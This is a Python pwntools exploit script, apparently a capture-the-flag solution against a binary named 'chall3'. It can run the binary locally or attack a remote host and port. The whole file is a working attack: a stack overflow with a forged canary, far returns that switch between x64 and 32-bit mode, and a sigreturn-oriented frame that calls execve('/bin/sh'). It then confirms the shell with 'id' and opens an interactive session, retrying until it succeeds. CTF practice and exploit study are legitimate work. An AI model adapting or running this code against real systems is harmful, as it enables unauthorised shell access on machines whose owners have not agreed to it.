#!/usr/bin/python
from pwn import *
import sys

HOST = ''
PORT = 1234

LOCAL = True
if len(sys.argv) > 1:
	LOCAL = False
	HOST = sys.argv[1]

if len(sys.argv) > 2:
	PORT = int(sys.argv[2])

while True:

	try:
		if LOCAL:
			io = process('../chall3')
		else:
			io = remote(HOST, PORT)

		canary  = p32(0x400144) # restart app
		canary += p32(0x33)     # cs in x64

		io.recvline()
		io.send(canary)
		io.recvline()

		context.clear(arch="i386")
		x32     = SigreturnFrame(kernel='i386')
		x32.eax = 0x0000000b    # SYS_execve
		x32.ebx = 0x06000400    # /bin/sh
		x32.edx = 0x00
		x32.ebp = 0x06000200
		x32.esp = 0x06000400
		x32.eip = 0x00400137    # int 0x80; retf
		x32.cs  = 0x23
		x32.ss  = 0x2b

		pay1  = cyclic(32)
		pay1 += canary
		pay1 += p64(0x400134)   # xchg esp, ebx; aaa; int 0x80; retf
		pay1 += cyclic(4)       # eax will end up as 4 (SYS_write on x32)

		io.send(pay1)
		io.recvline()
		io.send(canary)
		io.recvline()

		pay2  = cyclic(32)
		pay2 += p32(0x4001da)   # restart app
		pay2 += p32(0x33)       # cs in x64
		pay2 += p64(0x400137)   # int 0x80; retf
		pay2 += 'junkjunk'
		pay2 += p32(0x400144)   # restart app
		pay2 += p32(0x33)       # cs in x64
		pay2 += cyclic(79)
		pay2 += str(x32)[-17:]  # srop frame (the tail of the trimmed srop frame)
		pay2 += '\x00'*(0x100-len(pay2))

		io.send(pay2)
		io.recvline()
		io.send(canary)
		io.recvline()

		pay3  = 'junkjunk'      # padding
		pay3 += '/bin/sh\x00'   # canary
		pay3 += 'x'*16          # padding
		pay3 += '/bin/sh\x00'   # canary
		pay3 += p64(0x400137)   # int 0x80; retf
		pay3 += 'junkjunk'      # padding
		pay3 += str(x32)[:-17]  # trim srop frame to fit (kills ss)

		io.send(pay3)

		io.sendline('id')
		log.success('shell: %s' % io.recvline().strip())
		io.interactive()
		break
	except:
		io.close()

sys.exit()
